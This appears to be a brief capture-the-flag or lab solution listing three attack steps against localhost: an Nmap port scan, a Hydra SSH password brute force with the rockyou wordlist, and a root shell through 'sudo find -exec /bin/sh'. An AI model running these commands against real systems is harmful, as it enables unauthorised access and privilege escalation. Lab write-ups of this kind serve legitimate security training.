## Engagement steps
1. Port Scanning with Nmap and find ssh on 22
2. Hydra SSH Brute force password using rockyou.txt
3. Privilege escalation with `sudo find` to root


## Solution
Nmap port scan:
```sh
sudo nmap -sS -sC -p- 127.0.0.1 -vv
```

Crack password:
```sh
hydra -l brutus -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
```

Privileges escalation:
```sh
sudo find . -exec /bin/sh \; -quit
```
